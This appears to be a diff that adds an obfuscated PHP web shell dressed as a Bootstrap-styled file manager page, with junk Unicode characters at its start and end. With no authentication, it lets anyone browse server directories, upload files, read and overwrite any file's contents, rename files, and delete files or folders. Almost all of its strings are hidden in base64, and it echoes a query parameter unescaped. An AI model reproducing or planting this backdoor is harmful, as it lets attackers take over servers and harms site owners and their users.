@@ -1,0 +1,232 @@
+àડხვ്uಗކሎמງળיޓໍથ૧ած<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>þąաዋማĝቄ୍</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
+        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+
+<body>
+
+    <?php 
+
+    //function
+    function d0($g5)
+    {
+        if ($g5 >= 1073741824) {
+            $g5 = number_format($g5 / 1073741824, 2) . base64_decode('IEdC');
+        } elseif ($g5 >= 1048576) {
+            $g5 = number_format($g5 / 1048576, 2) . base64_decode('IE1C');
+        } elseif ($g5 >= 1024) {
+            $g5 = number_format($g5 / 1024, 2) . base64_decode('IEtC');
+        } elseif ($g5 > 1) {
+            $g5 = $g5 . base64_decode('IGJ5dGVz');
+        } elseif ($g5 == 1) {
+            $g5 = $g5 . base64_decode('IGJ5dGU=');
+        } else {
+            $g5 = base64_decode('MCBieXRlcw==');
+        }
+        return $g5;
+    }
+
+    function p1($d6)
+    {
+        return substr(strrchr($d6, base64_decode('Lg==')), 1);
+    }
+
+    function o2($d6)
+    {
+        $d7 = array(base64_decode('YXBuZw=='), base64_decode('YXZpZg=='), base64_decode('Z2lm'), base64_decode('anBn'), base64_decode('anBlZw=='), base64_decode('amZpZg=='), base64_decode('cGpwZWc='), base64_decode('cGpw'), base64_decode('cG5n'), base64_decode('c3Zn'), base64_decode('d2VicA=='));
+        $j8 = array(base64_decode('d2F2'), base64_decode('bTRh'), base64_decode('bTRi'), base64_decode('bXAz'), base64_decode('b2dn'), base64_decode('d2VibQ=='), base64_decode('bXBj'));
+        $f9 = strtolower(p1($d6));
+        if ($d6 == base64_decode('ZXJyb3JfbG9n')) {
+            return base64_decode('PGkgY2xhc3M9ImZhLXNoYXJwIGZhLXNvbGlkIGZhLWJ1ZyI+PC9pPiA=');
+        } elseif ($d6 == base64_decode('Lmh0YWNjZXNz')) {
+            return base64_decode('PGkgY2xhc3M9ImZhLXNvbGlkIGZhLWhhbW1lciI+PC9pPiA=');
+        }
+        if ($f9 == base64_decode('aHRtbA==') || $f9 == base64_decode('aHRt')) {
+            return base64_decode('PGkgY2xhc3M9ImZhLWJyYW5kcyBmYS1odG1sNSI+PC9pPiA=');
+        } elseif ($f9 == base64_decode('cGhw') || $f9 == base64_decode('cGh0bWw=')) {
+            return base64_decode('PGkgY2xhc3M9ImZhLWJyYW5kcyBmYS1waHAiPjwvaT4g');
+        } elseif (in_array($f9, $d7)) {
+            return base64_decode('PGkgY2xhc3M9ImZhLXJlZ3VsYXIgZmEtaW1hZ2VzIj48L2k+IA==');
+        } elseif ($f9 == base64_decode('Y3Nz')) {
+            return base64_decode('PGkgY2xhc3M9ImZhLWJyYW5kcyBmYS1jc3MzIj48L2k+IA==');
+        } elseif ($f9 == base64_decode('dHh0')) {
+            return base64_decode('PGkgY2xhc3M9ImZhLXJlZ3VsYXIgZmEtZmlsZS1saW5lcyI+PC9pPiA=');
+        } elseif (in_array($f9, $j8)) {
+            return base64_decode('PGkgY2xhc3M9ImZhLWR1b3RvbmUgZmEtZmlsZS1tdXNpYyI+PC9pPiA=');
+        } elseif ($f9 == base64_decode('cHk=')) {
+            return base64_decode('PGkgY2xhc3M9ImZhLWJyYW5kcyBmYS1weXRob24iPjwvaT4g');
+        } elseif ($f9 == base64_decode('anM=')) {
+            return base64_decode('PGkgY2xhc3M9ImZhLWJyYW5kcyBmYS1qcyI+PC9pPiA=');
+        } else {
+            return base64_decode('PGkgY2xhc3M9ImZhLXNvbGlkIGZhLWZpbGUiPjwvaT4g');
+        }
+    }
+
+    function s3($pa)
+    {
+        $mb = array(base64_decode('Lw=='), base64_decode('XA=='), base64_decode('Lg=='), base64_decode('Og=='));
+        $ec = array(base64_decode('4KaV'), base64_decode('4KaW'), base64_decode('4KaX'), base64_decode('4KaY'));
+        return str_replace($mb, $ec, $pa);
+    }
+    function f4($pa)
+    {
+        $mb = array(base64_decode('Lw=='), base64_decode('XA=='), base64_decode('Lg=='), base64_decode('Og=='));
+        $ec = array(base64_decode('4KaV'), base64_decode('4KaW'), base64_decode('4KaX'), base64_decode('4KaY'));
+        return str_replace($ec, $mb, $pa);
+    }
+
+
+
+    $bd = __DIR__;
+    if (isset($_GET[base64_decode('cA==')])) {
+        if (empty($_GET[base64_decode('cA==')])) {
+            $ke = $bd;
+        } elseif (!is_dir(f4($_GET[base64_decode('cA==')]))) {
+            echo (base64_decode('PHNjcmlwdD4KYWxlcnQoJ0RpcmVjdG9yeSBpcyBDb3JydXB0ZWQgYW5kIFVucmVhZGFibGUuJyk7CndpbmRvdy5sb2NhdGlvbi5yZXBsYWNlKCc/Jyk7Cjwvc2NyaXB0Pg=='));
+        } elseif (is_dir(f4($_GET[base64_decode('cA==')]))) {
+            $ke = f4($_GET[base64_decode('cA==')]);
+        }
+    } elseif (isset($_GET[base64_decode('cQ==')])) {
+        if (!is_dir(f4($_GET[base64_decode('cQ==')]))) {
+            echo (base64_decode('PHNjcmlwdD53aW5kb3cubG9jYXRpb24ucmVwbGFjZSgnP3A9Jyk7PC9zY3JpcHQ+'));
+        } elseif (is_dir(f4($_GET[base64_decode('cQ==')]))) {
+            $ke = f4($_GET[base64_decode('cQ==')]);
+        }
+    } else {
+        $ke = $bd;
+    }
+    define(base64_decode('UEFUSA=='), $ke);
+
+    echo (base64_decode('DQo8bmF2IGNsYXNzPSJuYXZiYXIgbmF2YmFyLWxpZ2h0IiBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjogI2UzZjJmZDsiPg0KICA8ZGl2IGNsYXNzPSJuYXZiYXItYnJhbmQiPg0KICA8YSBocmVmPSI/Ij48aW1nIHNyYz0iaHR0cHM6Ly9naXRodWIuY29tL2ZsdWlkaWNvbi5wbmciIHdpZHRoPSIzMCIgaGVpZ2h0PSIzMCIgYWx0PSIiPjwvYT4NCg=='));
+
+    $pa = str_replace(base64_decode('XFw='), base64_decode('Lw=='), PATH);
+    $zf = explode(base64_decode('Lw=='), $pa);
+    foreach ($zf as $g10 => $y11) {
+        if ($y11 == '' && $g10 == 0) {
+            $mb = true;
+            echo base64_decode('PGEgaHJlZj0iP3A9LyI+LzwvYT4=');
+            continue;
+        }
+        if ($y11 == '')
+            continue;
+        echo base64_decode('PGEgaHJlZj0nP3A9');
+        for ($h12 = 0; $h12 <= $g10; $h12++) {
+            echo str_replace(base64_decode('Og=='), base64_decode('4KaY'), $zf[$h12]);
+            if ($h12 != $g10)
+                echo base64_decode('4KaV');
+        }
+        echo base64_decode('Jz4=') . $y11 . base64_decode('PC9hPi8=');
+    }
+    echo (base64_decode('DQo8L2Rpdj4NCjxkaXYgY2xhc3M9ImZvcm0taW5saW5lIj4NCjxhIGhyZWY9Ij91cGxvYWQmcT0=') . urlencode(s3(PATH)) . base64_decode('Ij48YnV0dG9uIGNsYXNzPSJidG4gYnRuLWRhcmsiIHR5cGU9ImJ1dHRvbiI+VXBsb2FkIEZpbGU8L2J1dHRvbj48L2E+DQo8YSBocmVmPSI/Ij48YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tZGFyayI+SE9NRTwvYnV0dG9uPjwvYT4gDQo8L2Rpdj4NCjwvbmF2Pg=='));
+
+
+    if (isset($_GET[base64_decode('cA==')])) {
+
+        //fetch files
+        if (is_readable(PATH)) {
+            $a13 = scandir(PATH);
+            $y14 = array();
+            $f15 = array();
+            foreach ($a13 as $r16) {
+                if ($r16 == base64_decode('Lg==') || $r16 == base64_decode('Li4=')) {
+                    continue;
+                }
+                $n17 = PATH . base64_decode('Lw==') . $r16;
+                if (is_dir($n17)) {
+                    array_push($y14, $r16);
+                } elseif (is_file($n17)) {
+                    array_push($f15, $r16);
+                }
+            }
+        }
+        echo base64_decode('DQo8dGFibGUgY2xhc3M9InRhYmxlIHRhYmxlLWhvdmVyIj4NCiAgPHRoZWFkPg0KICAgIDx0cj4NCiAgICAgIDx0aCBzY29wZT0iY29sIj5OYW1lPC90aD4NCiAgICAgIDx0aCBzY29wZT0iY29sIj5TaXplPC90aD4NCiAgICAgIDx0aCBzY29wZT0iY29sIj5Nb2RpZmllZDwvdGg+DQogICAgICA8dGggc2NvcGU9ImNvbCI+UGVybXM8L3RoPg0KICAgICAgPHRoIHNjb3BlPSJjb2wiPkFjdGlvbnM8L3RoPg0KICAgIDwvdHI+DQogIDwvdGhlYWQ+DQogIDx0Ym9keT4NCg==');
+        foreach ($y14 as $v18) {
+            echo base64_decode('ICAgIDx0cj4NCiAgICAgIDx0ZD48aSBjbGFzcz0nZmEtc29saWQgZmEtZm9sZGVyJz48L2k+IDxhIGhyZWY9Jz9wPQ==') . urlencode(s3(PATH . base64_decode('Lw==') . $v18)) . base64_decode('Jz4=') . $v18 . base64_decode('PC9hPjwvdGQ+DQogICAgICA8dGQ+PGI+LS0tPC9iPjwvdGQ+DQogICAgICA8dGQ+'). date(base64_decode('RiBkIFkgSDppOnMu'), filemtime(PATH . base64_decode('Lw==') . $v18)) . base64_decode('PC90ZD4NCiAgICAgIDx0ZD4w') . substr(decoct(fileperms(PATH . base64_decode('Lw==') . $v18)), -3) . base64_decode('PC9hPjwvdGQ+DQogICAgICA8dGQ+DQogICAgICA8YSB0aXRsZT0nUmVuYW1lJyBocmVmPSc/cT0=') . urlencode(s3(PATH)) . base64_decode('JnI9') . $v18 . base64_decode('Jz48aSBjbGFzcz0nZmEtc2hhcnAgZmEtcmVndWxhciBmYS1wZW4tdG8tc3F1YXJlJz48L2k+PC9hPg0KICAgICAgPGEgdGl0bGU9J0RlbGV0ZScgaHJlZj0nP3E9') . urlencode(s3(PATH)) . base64_decode('JmQ9') . $v18 . base64_decode('Jz48aSBjbGFzcz0nZmEgZmEtdHJhc2gnIGFyaWEtaGlkZGVuPSd0cnVlJz48L2k+PC9hPg0KICAgICAgPHRkPg0KICAgIDwvdHI+DQo=');
+        }
+        foreach ($f15 as $d6) {
+            echo base64_decode('ICAgIDx0cj4NCiAgICAgICAgICA8dGQ+') . o2($d6) . $d6 . base64_decode('PC90ZD4NCiAgICAgICAgICA8dGQ+') . d0(filesize(PATH . base64_decode('Lw==') . $d6)) . base64_decode('PC90ZD4NCiAgICAgICAgICA8dGQ+') . date(base64_decode('RiBkIFkgSDppOnMu'), filemtime(PATH . base64_decode('Lw==') . $d6)) . base64_decode('PC90ZD4NCiAgICAgICAgICA8dGQ+MA=='). substr(decoct(fileperms(PATH . base64_decode('Lw==') .$d6)), -3) . base64_decode('PC9hPjwvdGQ+DQogICAgICAgICAgPHRkPg0KICAgICAgICAgIDxhIHRpdGxlPSdFZGl0IEZpbGUnIGhyZWY9Jz9xPQ==') . urlencode(s3(PATH)) . base64_decode('JmU9') . $d6 . base64_decode('Jz48aSBjbGFzcz0nZmEtc29saWQgZmEtZmlsZS1wZW4nPjwvaT48L2E+DQogICAgICAgICAgPGEgdGl0bGU9J1JlbmFtZScgaHJlZj0nP3E9') . urlencode(s3(PATH)) . base64_decode('JnI9') . $d6 . base64_decode('Jz48aSBjbGFzcz0nZmEtc2hhcnAgZmEtcmVndWxhciBmYS1wZW4tdG8tc3F1YXJlJz48L2k+PC9hPg0KICAgICAgICAgIDxhIHRpdGxlPSdEZWxldGUnIGhyZWY9Jz9xPQ==') . urlencode(s3(PATH)) . base64_decode('JmQ9') . $d6 . base64_decode('Jz48aSBjbGFzcz0nZmEgZmEtdHJhc2gnIGFyaWEtaGlkZGVuPSd0cnVlJz48L2k+PC9hPg0KICAgICAgICAgIDx0ZD4NCiAgICA8L3RyPg0K');
+        }
+        echo base64_decode('ICA8L3Rib2R5Pg0KPC90YWJsZT4=');
+    } else {
+        if (empty($_GET)) {
+            echo (base64_decode('PHNjcmlwdD53aW5kb3cubG9jYXRpb24ucmVwbGFjZSgnP3A9Jyk7PC9zY3JpcHQ+'));
+        }
+    }
+    if (isset($_GET[base64_decode('dXBsb2Fk')])) {
+        echo base64_decode('DQogICAgPGZvcm0gbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4NCiAgICAgICAgU2VsZWN0IGZpbGUgdG8gdXBsb2FkOg0KICAgICAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZVRvVXBsb2FkIiBpZD0iZmlsZVRvVXBsb2FkIj4NCiAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tZGFyayIgdmFsdWU9IlVwbG9hZCIgbmFtZT0idXBsb2FkIj4NCiAgICA8L2Zvcm0+');
+    }
+    if (isset($_GET[base64_decode('cg==')])) {
+        if (!empty($_GET[base64_decode('cg==')]) && isset($_GET[base64_decode('cQ==')])) {
+            echo base64_decode('DQogICAgPGZvcm0gbWV0aG9kPSJwb3N0Ij4NCiAgICAgICAgUmVuYW1lOg0KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0ibmFtZSIgdmFsdWU9Ig==') . $_GET[base64_decode('cg==')] . base64_decode('Ij4NCiAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tZGFyayIgdmFsdWU9IlJlbmFtZSIgbmFtZT0icmVuYW1lIj4NCiAgICA8L2Zvcm0+');
+            if (isset($_POST[base64_decode('cmVuYW1l')])) {
+                $z19 = PATH . base64_decode('Lw==') . $_GET[base64_decode('cg==')];
+                if(rename($z19, PATH . base64_decode('Lw==') . $_POST[base64_decode('bmFtZQ==')])) {
+                    echo (base64_decode('PHNjcmlwdD5hbGVydCgnUmVuYW1lZC4nKTsgd2luZG93LmxvY2F0aW9uLnJlcGxhY2UoJz9wPQ==') . s3(PATH) . base64_decode('Jyk7PC9zY3JpcHQ+'));
+                } else {
+                    echo (base64_decode('PHNjcmlwdD5hbGVydCgnU29tZSBlcnJvciBvY2N1cnJlZC4nKTsgd2luZG93LmxvY2F0aW9uLnJlcGxhY2UoJz9wPQ==') . s3(PATH) . base64_decode('Jyk7PC9zY3JpcHQ+'));
+                }
+            }
+        }
+    }
+
+    if (isset($_GET[base64_decode('ZQ==')])) {
+        if (!empty($_GET[base64_decode('ZQ==')]) && isset($_GET[base64_decode('cQ==')])) {
+            echo base64_decode('DQogICAgPGZvcm0gbWV0aG9kPSJwb3N0Ij4NCiAgICAgICAgPHRleHRhcmVhIHN0eWxlPSJoZWlnaHQ6IDUwMHB4Ow0KICAgICAgICB3aWR0aDogOTAlOyIgbmFtZT0iZGF0YSI+') . htmlspecialchars(file_get_contents(PATH.base64_decode('Lw==').$_GET[base64_decode('ZQ==')])) . base64_decode('PC90ZXh0YXJlYT4NCiAgICAgICAgPGJyPg0KICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1kYXJrIiB2YWx1ZT0iU2F2ZSIgbmFtZT0iZWRpdCI+DQogICAgPC9mb3JtPg==');
+
+    if(isset($_POST[base64_decode('ZWRpdA==')])) {
+        $n1a = PATH.base64_decode('Lw==').$_GET[base64_decode('ZQ==')];
+        $h1b = $_POST[base64_decode('ZGF0YQ==')];
+        $c1c = fopen($n1a,base64_decode('dw=='));
+        if(fwrite($c1c,$h1b)) {
+            echo (base64_decode('PHNjcmlwdD5hbGVydCgnU2F2ZWQuJyk7IHdpbmRvdy5sb2NhdGlvbi5yZXBsYWNlKCc/cD0=') . s3(PATH) . base64_decode('Jyk7PC9zY3JpcHQ+'));
+        } else {
+            echo (base64_decode('PHNjcmlwdD5hbGVydCgnU29tZSBlcnJvciBvY2N1cnJlZC4nKTsgd2luZG93LmxvY2F0aW9uLnJlcGxhY2UoJz9wPQ==') . s3(PATH) . base64_decode('Jyk7PC9zY3JpcHQ+'));
+        }
+        fclose($c1c);
+    }
+        }
+    }
+
+    if (isset($_POST[base64_decode('dXBsb2Fk')])) {
+        $j1d = PATH . base64_decode('Lw==') . $_FILES[base64_decode('ZmlsZVRvVXBsb2Fk')][base64_decode('bmFtZQ==')];
+        if (move_uploaded_file($_FILES[base64_decode('ZmlsZVRvVXBsb2Fk')][base64_decode('dG1wX25hbWU=')], $j1d)) {
+            echo base64_decode('PHA+').htmlspecialchars(basename($_FILES[base64_decode('ZmlsZVRvVXBsb2Fk')][base64_decode('bmFtZQ==')])) . base64_decode('IGhhcyBiZWVuIHVwbG9hZGVkLjwvcD4=');
+        } else {
+            echo base64_decode('PHA+U29ycnksIHRoZXJlIHdhcyBhbiBlcnJvciB1cGxvYWRpbmcgeW91ciBmaWxlLjwvcD4=');
+        }
+
+    }
+    if (isset($_GET[base64_decode('ZA==')]) && isset($_GET[base64_decode('cQ==')])) {
+        $z19 = PATH . base64_decode('Lw==') . $_GET[base64_decode('ZA==')];
+        if (is_file($z19)) {
+            if(unlink($z19)) {
+                echo (base64_decode('PHNjcmlwdD5hbGVydCgnRmlsZSByZW1vdmVkLicpOyB3aW5kb3cubG9jYXRpb24ucmVwbGFjZSgnP3A9') . s3(PATH) . base64_decode('Jyk7PC9zY3JpcHQ+'));
+            } else {
+                echo (base64_decode('PHNjcmlwdD5hbGVydCgnU29tZSBlcnJvciBvY2N1cnJlZC4nKTsgd2luZG93LmxvY2F0aW9uLnJlcGxhY2UoJz9wPQ==') . s3(PATH) . base64_decode('Jyk7PC9zY3JpcHQ+'));
+            }
+        } elseif (is_dir($z19)) {
+            if(rmdir($z19) == true) {
+                echo (base64_decode('PHNjcmlwdD5hbGVydCgnRGlyZWN0b3J5IHJlbW92ZWQuJyk7IHdpbmRvdy5sb2NhdGlvbi5yZXBsYWNlKCc/cD0=') . s3(PATH) . base64_decode('Jyk7PC9zY3JpcHQ+'));
+            } else {
+                echo (base64_decode('PHNjcmlwdD5hbGVydCgnU29tZSBlcnJvciBvY2N1cnJlZC4nKTsgd2luZG93LmxvY2F0aW9uLnJlcGxhY2UoJz9wPQ==') . s3(PATH) . base64_decode('Jyk7PC9zY3JpcHQ+'));
+            }
+        }
+    }
+    ?>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
+        crossorigin="anonymous"></script>
+</body>
+
+</html>*զુçવยIމୁკßরީއҖчୁይҔ
